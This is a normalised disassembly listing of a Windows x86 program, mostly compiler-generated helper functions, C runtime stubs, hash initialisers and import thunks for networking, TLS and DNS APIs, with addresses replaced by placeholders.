mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_40a558
mov al [ ecx + 0xc ]
retn
sub_40a55c
mov al [ ecx + 0xd ]
retn
sub_40a560
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_403dc1
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_40a57a
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_403dc1
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_40a594
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_403dc1
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_40a5ae
push esi
mov esi ecx
call sub_40a52c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40a71e
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_40ab67
sub ecx 0xc
jmp sub_406614
sub_40ab6f
sub ecx 0x4
jmp sub_406614
sub_40ab77
sub ecx 0x8
jmp sub_406614
sub_40ab7f
mov [ ecx ] r--data
retn
sub_40ab86
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40aba3
mov [ ecx ] r--data
retn
sub_40abaa
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40abc7
mov [ ecx ] r--data
retn
sub_40abce
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40abeb
mov [ ecx ] r--data
retn
sub_40abf2
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40ac0f
retn
sub_40ac10
push esi
mov esi ecx
call sub_40af95
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_40d125
mov eax [ eax + 0x160 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x8 ]
retn
sub_40f513
push 0x10
call sub_4246c6
pop ecx
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] eax
retn
mov [ ecx ] eax
sub_40f52b
push 0x44
call sub_4246c6
pop ecx
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] eax
retn
mov [ ecx ] eax
sub_40f971
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
push 0x0
push 0x0
call sub_42597b
int3
sub_40fa60
sub ecx 0x8
jmp sub_40ac10
sub_40fa68
sub ecx 0xc
jmp sub_40ac10
sub_40fa70
sub ecx 0x4
jmp sub_40ac10
sub_40fa78
and [ edi + 0x8 ] 0x0
push esi
lea esi [ edi + 0xc ]
mov [ edi ] r--data
mov [ edi + 0x4 ] eax
call sub_403dae
or [ edi + 0x28 ] 0xffffffff
mov eax edi
pop esi
retn
sub_40fa96
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0xc
call sub_40415f
retn
sub_40faa9
push esi
mov esi ecx
call sub_40fa96
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
j_sub_40fb35
jmp sub_40fb35
sub_40fb35
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_40fb5d
push [ esi ]
call sub_42412e
pop ecx
call sub_425e4c
retn 0x4
sub_410038
push 0x0
push 0x1
call sub_40415f
retn
sub_410042
push esi
mov esi ecx
call sub_410125
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_410158
push esi
mov esi ecx
push [ esi + 0x34 ]
call [ EnterCriticalSection@IAT ]
mov [ esi + 0x4c ] 0x1
push [ esi + 0x34 ]
call [ LeaveCriticalSection@IAT ]
pop esi
retn
sub_4102b1
mov eax [ ecx + 0x40 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov eax [ ecx + 0x44 ]
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
retn 0x8
sub_41030e
push esi
mov esi ecx
mov [ esi ] r--data
call sub_410125
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_410330
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push esi
call sub_41005e
mov [ esi ] r--data
mov eax esi
retn 0x10
sub_410620
mov [ ecx ] r--data
retn
sub_410627
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_410644
push esi
mov esi ecx
call sub_410874
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_410bd5
push esi
mov esi ecx
call sub_410bfb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
j_sub_412b14
jmp sub_412b14
j_sub_412e49
jmp sub_412e49
sub_412aeb
push 0xffffffff
push 0x0
push [ esp + 0xc ]
lea ecx [ esi + 0x110 ]
call sub_40400a
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
lea ecx [ esi + 0x12c ]
call sub_40400a
retn 0x8
sub_412b14
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_4131b5
push [ esi ]
call sub_42412e
pop ecx
call sub_425e4c
retn 0x4
sub_412e49
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_413229
push [ esi ]
call sub_42412e
pop ecx
call sub_425e4c
retn 0x4
sub_413117
push esi
lea esi [ edi + 0x1c ]
call sub_413463
push [ esi ]
call sub_42412e
pop ecx
push 0x0
push 0x1
mov ecx edi
call sub_40415f
pop esi
retn
sub_413ea5
call sub_414157
lea ecx [ esi + 0x18 ]
mov [ ecx ] eax
mov [ eax + 0x2d ] 0x1
mov eax [ ecx ]
mov [ eax + 0x4 ] eax
mov eax [ ecx ]
mov [ eax ] eax
mov ecx [ ecx ]
mov [ ecx + 0x8 ] ecx
and [ esi + 0x1c ] 0x0
retn
sub_413ff3
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
call sub_41c1da
push 0x0
push 0x0
call sub_42597b
int3
sub_4141e1
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
push 0x0
push 0x0
call sub_42597b
int3
sub_4141f4
push esi
mov esi ecx
call sub_4142cf
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4142cf
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0x8 ]
mov [ esi ] r--data
call sub_40415f
mov [ esi ] r--data
pop esi
retn
sub_41439b
push esi
mov esi ecx
call sub_414476
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_414476
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0x8 ]
mov [ esi ] r--data
call sub_40415f
mov [ esi ] r--data
pop esi
retn
sub_414967
push esi
mov esi ecx
call sub_4149df
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4149df
push ecx
mov [ ecx ] r--data
add ecx 0x4
push ecx
call sub_414b22
pop ecx
retn
sub_414b22
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_414dac
push [ esi ]
call sub_42412e
pop ecx
call sub_425e4c
retn 0x4
sub_415400
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_41541d
mov [ ecx ] r--data
retn
sub_415b27
xor ecx ecx
mov [ eax + 0x5c ] cl
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x67452301
mov [ eax + 0x10 ] 0xefcdab89
mov [ eax + 0x14 ] 0x98badcfe
mov [ eax + 0x18 ] 0x10325476
retn
sub_415d82
push esi
mov esi ecx
call sub_415d9e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_415d9e
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_40415f
mov [ esi ] r--data
pop esi
retn
sub_4166e5
and [ esi + 0x4 ] 0x0
cmp [ esp + 0x4 ] 0x0
mov [ esi ] r--data
je r-xdata
mov eax esi
retn 0x4
push [ esp + 0x4 ]
mov ecx esi
call sub_416723
sub_416706
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4167e6
push esi
mov esi ecx
call sub_416802
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_416f30
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
jmp [ eax + 0x14 ]
sub_416fb2
push edi
mov edi eax
add edi 0xb4
lea eax [ esp + 0x8 ]
call sub_40f16e
pop edi
retn 0x4
sub_416fc8
push esi
mov esi eax
call sub_408d2b
push [ esi + 0x14 ]
call sub_42412e
push [ esi ]
and [ esi + 0x14 ] 0x0
call sub_42412e
pop ecx
pop ecx
pop esi
retn
sub_416fe7
push [ eax ]
call sub_42412e
pop ecx
retn
sub_417010
push esi
mov esi [ eax ]
test esi esi
je r-xdata
pop esi
retn
push esi
call [ DeleteCriticalSection@IAT ]
push esi
call sub_42412e
pop ecx
sub_41706f
push esi
mov esi ecx
call sub_41708b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_418086
push esi
mov esi ecx
call sub_41833a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_41863b
push esi
mov esi ecx
call sub_418657
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_418e4c
cmp al 0xa
je r-xdata
xor eax eax
inc eax
retn
cmp al 0xd
je r-xdata
cmp al 0x20
je r-xdata
xor eax eax
retn
sub_418e9c
push edi
mov edi eax
call sub_418ebb
push [ edi + 0x14 ]
call sub_42412e
push [ edi ]
and [ edi + 0x14 ] 0x0
call sub_42412e
pop ecx
pop ecx
pop edi
retn
sub_418f5e
push 0x40
call sub_4246c6
pop ecx
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] eax
retn
mov [ ecx ] eax
sub_418fdd
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
push 0x0
push 0x0
call sub_42597b
int3
sub_418ff0
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_403de3
mov eax [ ebp + 0x8 ]
leave
retn
sub_419084
push esi
mov esi ecx
call sub_4190a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_419609
xor al al
retn 0x4
sub_41965c
push esi
mov esi ecx
call sub_419639
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_419678
lea eax [ ecx + 0x44 ]
retn
sub_41967c
lea eax [ ecx + 0x60 ]
retn
sub_419680
mov eax [ ecx + 0x40 ]
retn
sub_419684
mov al [ ecx + 0x7c ]
retn
sub_419688
lea eax [ ecx + 0x20 ]
retn
sub_41968c
mov [ ecx + 0x7c ] 0x0
retn
sub_419725
push esi
mov esi ecx
call sub_419741
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4197e2
push esi
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov esi ecx
lea ecx [ esi + 0x44 ]
call sub_40400a
mov [ esi + 0x7c ] 0x1
pop esi
retn 0x4
sub_419bb1
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
lea ecx [ esi + 0x4 ]
call sub_403f4b
mov [ esi + 0x7c ] 0x1
pop esi
retn 0x4
sub_419c32
xor eax eax
cmp [ ecx + 0x3c ] eax
setne al
retn
sub_41a08b
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
push 0x0
push 0x0
call sub_42597b
int3
sub_41a09e
mov [ ecx ] r--data
retn
sub_41a0a5
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_41a261
push esi
mov esi ecx
call sub_41a282
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
j_sub_41bf04
jmp sub_41bf04
sub_41a8a2
xor al al
retn 0x8
sub_41be52
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x2c ]
push 0xffffffff
push 0x0
push eax
lea ecx [ esi + 0x34 ]
call sub_40400a
pop esi
retn 0x8
sub_41bf04
push 0x0
mov eax sub_43bffe
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_41c258
push [ esi ]
call sub_42412e
pop ecx
call sub_425e4c
retn 0x4
sub_41c327
sub ecx 0x4
jmp sub_41a261
sub_41c32f
sub ecx 0x8
jmp sub_41a261
sub_41c337
sub ecx 0xc
jmp sub_41a261
sub_41c33f
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_41c35c
mov [ ecx ] r--data
retn
sub_41c363
xor ecx ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x60 ] ecx
mov [ eax + 0x4 ] 0x67452301
mov [ eax + 0x8 ] 0xefcdab89
mov [ eax + 0xc ] 0x98badcfe
mov [ eax + 0x10 ] 0x10325476
mov [ eax + 0x14 ] 0xc3d2e1f0
mov [ eax + 0x64 ] cl
mov [ eax + 0x65 ] cl
retn
sub_41c6ca
mov eax [ esp + 0x4 ]
add ecx 0x4
call sub_41e91d
retn 0x4
sub_41c7a8
lea eax [ ecx + 0x3c ]
retn
sub_41c7ac
lea eax [ ecx + 0x4 ]
retn
sub_41c7b0
lea eax [ ecx + 0x58 ]
retn
sub_41c7b4
push [ esp + 0xc ]
mov eax [ ecx ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ eax + 0x48 ]
test eax eax
setne al
retn 0xc
sub_41c7cd
push [ esp + 0x8 ]
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x54 ]
test eax eax
setne al
retn 0x8
sub_41c7e2
xor eax eax
cmp [ ecx + 0x34 ] eax
sete al
retn
sub_41c7eb
mov eax [ ecx + 0x78 ]
retn
sub_41c7ef
mov eax [ ecx + 0x9c ]
retn
sub_41c7f6
lea eax [ ecx + 0x130 ]
retn
sub_41c7fd
lea eax [ ecx + 0x1d8 ]
retn
sub_41c804
lea eax [ ecx + 0x29c ]
retn
sub_41c80b
lea eax [ ecx + 0x280 ]
retn
sub_41c812
mov eax [ ecx + 0xa0 ]
retn
sub_41c819
mov eax [ ecx + 0x2f0 ]
retn
sub_41c8a8
mov eax [ ecx + 0xa4 ]
retn
sub_41c8af
lea eax [ ecx + 0x2b8 ]
retn
sub_41c9a4
push esi
mov esi ecx
call sub_41cb16
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_41ea56
mov eax [ esi ]
test eax eax
je r-xdata
call sub_423d5c
cmp eax [ edi ]
je r-xdata
mov eax [ esi + 0x4 ]
xor ecx ecx
cmp eax [ edi + 0x4 ]
setne cl
mov al cl
retn
sub_41ec5c
push esi
mov esi ecx
call sub_41eefe
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_420181
push ecx
push edi
mov edi eax
mov eax [ edi + 0x14 ]
mov ecx [ edi ]
push eax
push ecx
push [ esp + 0x14 ]
call sub_42029a
pop edi
pop ecx
retn 0x4
sub_420429
mov al [ ecx + 0x130 ]
retn
sub_420430
lea eax [ ecx + 0x78 ]
retn
sub_420434
push esi
mov esi ecx
call sub_4203ea
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_420523
push esi
mov esi ecx
call sub_42053f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_420577
lea eax [ ecx + 0x134 ]
cmp [ eax ] 0x0
je r-xdata
xor al al
retn 0x4
mov eax [ eax ]
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x4 ]
sub_420672
push esi
mov esi ecx
call sub_42068e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_421249
push esi
mov esi ecx
call sub_4213d9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_4213d9
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0x8 ]
mov [ esi ] r--data
call sub_40415f
mov [ esi ] r--data
pop esi
retn
sub_421597
push esi
mov esi ecx
call sub_4217a3
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_42267a
cmp [ eax + 0x4 ] 0x0
jne r-xdata
retn
push 0x0
call sub_424869
pop ecx
sub_4228a5
cmp [ esi ] 0x0
jne r-xdata
retn
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esi ] eax
sub_422bbb
mov edi edi
push esi
call sub_4262c2
mov esi [ eax + 0x8 ]
call sub_42629c
mov edx eax
mov eax esi
pop esi
retn
sub_422c7f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424852
pop ecx
test eax eax
je r-xdata
pop ebp
retn
pop ebp
jmp sub_4262e8
sub_422c99
mov ecx [ ecx + 0x4 ]
call sub_406175
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_422d1c
mov eax [ rw-data ]
retn
sub_423066
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_423443
pop ecx
sub_423097
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_423423
push [ esi ]
call sub_42412e
pop ecx
pop ecx
pop esi
retn
sub_4230ae
push [ ecx ]
call sub_423433
pop ecx
retn
sub_4230b7
push [ ecx ]
call sub_423443
pop ecx
retn
j_sub_427730
jmp sub_427730
sub_4230c5
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4246c6
sub_42334f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] eax
pop ebp
retn
sub_42335f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] sub_42334f
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_4233b5
push r-xdata
call sub_424852
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_4233ee
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ rw-data ] eax
test ecx ecx
je r-xdata
retn
cmp eax 0xa
jb r-xdata
call [ eax * 4 + rw-data ]
sub_423413
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_423423
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_423433
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_423443
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
gethostbyname
jmp [ gethostbyname@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostname
jmp [ gethostname@IAT ]
htons
jmp [ htons@IAT ]
send
jmp [ send@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
select
jmp [ select@IAT ]
recv
jmp [ recv@IAT ]
closesocket
jmp [ closesocket@IAT ]
socket
jmp [ socket@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
setsockopt
jmp [ setsockopt@IAT ]
getprotobyname
jmp [ getprotobyname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
connect
jmp [ connect@IAT ]
QueryContextAttributesA
jmp [ QueryContextAttributesA@IAT ]
DecryptMessage
jmp [ DecryptMessage@IAT ]
AcquireCredentialsHandleA
jmp [ AcquireCredentialsHandleA@IAT ]
InitializeSecurityContextA
jmp [ InitializeSecurityContextA@IAT ]
EncryptMessage
jmp [ EncryptMessage@IAT ]
FreeContextBuffer
jmp [ FreeContextBuffer@IAT ]
DnsQuery_A
jmp [ DnsQuery_A@IAT ]
DnsFree
jmp [ DnsFree@IAT ]
sub_4237f0
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_423854
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_4238ce
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_424869
pop ecx
sub_4238e4
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_42390f
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_423871
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42392c
mov [ ecx ] r--data
jmp sub_4238ce
sub_423a43
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_423a2d
sub_423a8b
push 0xc
push r--data
call sub_42b398
call sub_42a735
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_423a4e
sub_423ac0
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_42b1b3
int3
sub_423bff
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_423d5c
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423d36
add esp 0x14
retn
sub_423e26
push [ ebp + 0x8 ]
call sub_42b764
pop ecx
retn
sub_423e30
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_423d6c
add esp 0xc
pop ebp
retn
sub_4240dd
push [ ebp + 0x18 ]
call sub_42b764
pop ecx
retn
sub_4240e7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_424051
add esp 0x14
pop ebp
retn
sub_424390
push [ ebp + 0x14 ]
call sub_42b764
pop ecx
retn
sub_42449f
push [ ebp + 0x8 ]
call sub_42b764
pop ecx
retn
sub_424554
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4244a9
pop ecx
pop ecx
pop ebp
retn
sub_424567
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_42dd98
pop ecx
retn
sub_4246a3
push esi
call sub_42b764
pop ecx
retn
sub_4246ab
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_423854
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_42484c
call sub_42afa2
retn
sub_424852
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424816
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_4248bf
push 0x4
call sub_42e1de
pop ecx
retn
sub_4248f7
call sub_42a735
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4266f5
sub_42491d
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_42412e
sub_424976
call sub_42a735
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_424be7
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call sub_42eecd
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_424c6d
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_424bc4
sub_4250b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0x1
call sub_424e02
pop ecx
pop ebp
retn
sub_42547b
push 0x4
call sub_42e1de
pop ecx
retn
sub_425692
push 0x4
call sub_42e1de
pop ecx
retn
sub_4258a6
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_42b236
pop ecx
pop ecx
retn
sub_4258ba
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_42b1d8
push eax
call sub_42b1b3
sub_4258d4
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_42b3dd
retn
_start
call sub_4307e5
jmp sub_425792
sub_425e4c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_425e60
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_4234de
jmp sub_425e4c
sub_42629c
call sub_42a735
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4266f5
sub_4262c2
call sub_42a735
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4266f5
sub_42675f
push 0xc
call sub_42e1de
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_42686b
push 0xd
call sub_42e1de
pop ecx
retn
sub_426877
push 0xc
call sub_42e1de
pop ecx
retn
sub_426880
xor eax eax
retn
sub_427452
push 0xc
call sub_42e1de
pop ecx
retn
sub_42745e
push 0xc
call sub_42e1de
pop ecx
retn
sub_42748f
and [ esi + 0x70 ] 0xffffffef
retn
sub_4274b2
mov [ ecx ] r--data
jmp sub_4238ce
sub_42760e
push [ ebp - 0x14 ]
call sub_427543
pop ecx
retn
sub_427652
call sub_42a735
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_42a735
add eax 0x90
dec [ eax ]
sub_4276f5
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_4276fe
mov esp [ ebp - 0x18 ]
call sub_42eecd
sub_427730
call sub_42a735
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne cl
mov al cl
retn
sub_4277be
push 0x4
mov eax sub_43a6af
call sub_425de0
call sub_42a735
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_42ef06
call sub_42ef19
sub_427897
